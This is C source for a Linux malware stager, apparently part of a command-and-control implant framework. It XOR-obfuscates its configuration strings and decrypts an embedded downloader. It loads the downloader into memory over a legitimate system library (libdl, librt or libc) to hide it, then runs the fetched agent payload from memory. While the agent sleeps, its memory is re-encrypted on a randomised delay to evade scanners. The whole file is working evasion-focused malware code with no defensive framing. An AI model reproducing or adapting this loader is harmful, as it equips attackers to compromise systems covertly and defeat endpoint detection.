#define _GNU_SOURCE
#include "elf_loader.h"
#include "utils.h"
#include "downloader_api.h"
#include "downloader_blob.h" // Generated at build time

/* Configurable Options - XOR-encoded byte arrays to hide strings */
#ifndef CONFIG_XOR_KEY
#define CONFIG_XOR_KEY 0x5A
#endif

// XOR-encoded configuration arrays
// We only need module_path here for stomping
// encoded_host/port/path/key are in downloader

// Forward declarations
static void decode_config_string(char *dest, const unsigned char *encoded, size_t max_len);
void xor_payload(char *data, size_t len, const uint8_t *key, size_t key_len);

static volatile int g_trap_requested = 0;
static void sigtrap_handler(int signo) {
  (void)signo;
  g_trap_requested = 1;
}

void stager_main(long *sp);

__asm__(".section .init,\"ax\",@progbits\n"
        ".global _start\n"
        "_start:\n"
        "xor %rbp, %rbp\n"
        "mov %rsp, %rdi\n"
        "and $0xfffffffffffffff0, %rsp\n"
        "call stager_main\n"
        "mov $60, %rax\n"
        "xor %rdi, %rdi\n"
        "syscall\n");

void stager_main(long *sp) {
  long argc = *sp;
  char **argv = (char **)(sp + 1);
  char **envp = argv + argc + 1;

  char module_path[256] = {0};
  
#ifdef ENCODED_MODULE_PATH
  static const unsigned char encoded_module_path[] = {ENCODED_MODULE_PATH};
  decode_config_string(module_path, encoded_module_path, sizeof(module_path));
#endif

  // Setup signal handler
  struct sigaction trap_sa;
  memset(&trap_sa, 0, sizeof(trap_sa));
  trap_sa.sa_handler = sigtrap_handler;
  sigemptyset(&trap_sa.sa_mask);
  sigaction(SIGTRAP, &trap_sa, NULL);

  // 1. Prepare Downloader
  // Map memory for downloader blob
  void *dl_mem = mmap(NULL, downloader_bin_len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (dl_mem == MAP_FAILED) exit(1);
  
  memcpy(dl_mem, downloader_bin, downloader_bin_len);
  
  // Decrypt Downloader (XOR with downloader_key defined in blob header)
  xor_payload((char *)dl_mem, downloader_bin_len, downloader_key, 16);

  // Load Downloader ELF
  size_t dl_base = 0;
  size_t dl_entry_addr = 0;
  size_t dl_mapped_size = 0;
  char dl_module_path[64] = {0};
  
  // Try to find a universal library for stomping
  const char *candidates[] = {
      "/lib/x86_64-linux-gnu/libdl.so.2",
      "/lib64/libdl.so.2",
      "/usr/lib/x86_64-linux-gnu/libdl.so.2",
      "/lib/x86_64-linux-gnu/librt.so.1",
      "/lib64/librt.so.1",
      "/lib/x86_64-linux-gnu/libc.so.6",
      "/lib64/libc.so.6"
  };
  
  for (int i = 0; i < 7; i++) {
      int fd = open(candidates[i], O_RDONLY, 0);
      if (fd >= 0) {
          close(fd);
          long len = strlen(candidates[i]);
          if (len < 63) {
            memcpy(dl_module_path, candidates[i], len);
            dl_module_path[len] = '\0';
            break;
          }
      }
  }

  // elf_load arguments: char *elf_start, void *stack, int stack_size, size_t *base_addr, size_t *entry, size_t *mapped_size, int pre_mapped, const char *module_path
  int ret = elf_load((char *)dl_mem, NULL, 0, &dl_base, &dl_entry_addr, &dl_mapped_size, 0, dl_module_path[0] ? dl_module_path : NULL);
  if (ret != 0) exit(1);

  // Run Downloader
  typedef void (*dl_func)(struct download_result *);
  dl_func dl_entry = (dl_func)dl_entry_addr;
  
  struct download_result res = {0};
  dl_entry(&res);

  // Cleanup Downloader
  // 1. Wipe and unmap the blob
  memset(dl_mem, 0, downloader_bin_len);
  munmap(dl_mem, downloader_bin_len);

  // 2. Restore/Unmap the loaded ELF
  if (dl_base && dl_mapped_size > 0) {
      if (dl_module_path[0] != '\0') {
          // Restore from file (put module back)
          int fd = open(dl_module_path, O_RDONLY, 0);
          if (fd >= 0) {
              // Map over the existing stomped memory
              // using MAP_FIXED to replace the mapping
              void *restored = mmap((void *)dl_base, dl_mapped_size, PROT_READ | PROT_EXEC, MAP_PRIVATE | MAP_FIXED, fd, 0);
              if (restored == MAP_FAILED) {
                  // If failed, just unmap
                  munmap((void *)dl_base, dl_mapped_size);
              }
              close(fd);
          } else {
              munmap((void *)dl_base, dl_mapped_size);
          }
      } else {
          // Just unmap anonymous memory
          munmap((void *)dl_base, dl_mapped_size);
      }
  }

  if (!res.data || res.size == 0) exit(1);

  // 2. Load Agent
  char *final_payload = res.data;
  
  // PIE Check
  Elf_Ehdr *hdr = (Elf_Ehdr *)final_payload;
  if (hdr->e_type == ET_DYN) {
      // PIE
      long pid = fork();
      if (pid == 0) {
          elf_run(final_payload, argv, envp, 0, module_path);
          exit(0);
      } else if (pid > 0) {
          free(final_payload); // Clean up agent buffer
          // Monitor loop (same as main.c)
          int status = 0;
          while (1) {
              long res = waitpid((int)pid, &status, WUNTRACED);
              if (res == pid) {
                  if (WIFEXITED(status) || WIFSIGNALED(status)) break;
                  if (WIFSTOPPED(status)) kill((int)pid, SIGCONT);
              }
              if (g_trap_requested) {
                  kill((int)pid, SIGKILL);
                  break;
              }
          }
      }
  } else {
      // Static (Shared Memory Rotation)
      size_t min_vaddr = 0, max_vaddr = 0;
      if (elf_get_memory_bounds(final_payload, &min_vaddr, &max_vaddr) != 0) exit(1);
      
      size_t map_len = max_vaddr - min_vaddr;
      void *shared_mem = (void *)mmap((void *)min_vaddr, map_len, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
      if (shared_mem == MAP_FAILED) exit(1);

      long pid = fork();
      if (pid == 0) {
          elf_run(final_payload, argv, envp, 1, module_path);
          exit(0);
      } else if (pid > 0) {
          free(final_payload);
          uint8_t rotator_key[16] = {0};
          int status = 0;
          while (1) {
              long res = waitpid((int)pid, &status, WUNTRACED);
              if (res == pid) {
                  if (WIFEXITED(status) || WIFSIGNALED(status)) break;
                  if (WIFSTOPPED(status)) {
                      int sig = WSTOPSIG(status);
                      if (sig == SIGSTOP) {
                           getrandom(rotator_key, 16, 0);
                           xor_payload((char *)shared_mem, map_len, rotator_key, 16);
                           
                           unsigned int sleep_s = 0;
                           getrandom(&sleep_s, sizeof(sleep_s), 0);
                           sleep_s = 180 + (sleep_s % 300);
                           struct timespec req = {sleep_s, 0};
                           nanosleep(&req, NULL);
                           
                           xor_payload((char *)shared_mem, map_len, rotator_key, 16);
                           kill((int)pid, SIGCONT);
                      } else {
                          kill((int)pid, SIGCONT);
                      }
                  }
              }
              if (g_trap_requested) {
                  kill((int)pid, SIGKILL);
                  waitpid((int)pid, &status, 0);
                  break;
              }
          }
      }
  }
  exit(0);
}

void xor_payload(char *data, size_t len, const uint8_t *key, size_t key_len) {
  for (size_t i = 0; i < len; i++) {
    data[i] ^= key[i % key_len];
  }
}

static void decode_config_string(char *dest, const unsigned char *encoded, size_t max_len) {
  size_t i = 0;
  while (i < max_len - 1) {
    if (encoded[i] == 0x00) break;
    dest[i] = encoded[i] ^ CONFIG_XOR_KEY;
    i++;
  }
  dest[i] = '\0';
}
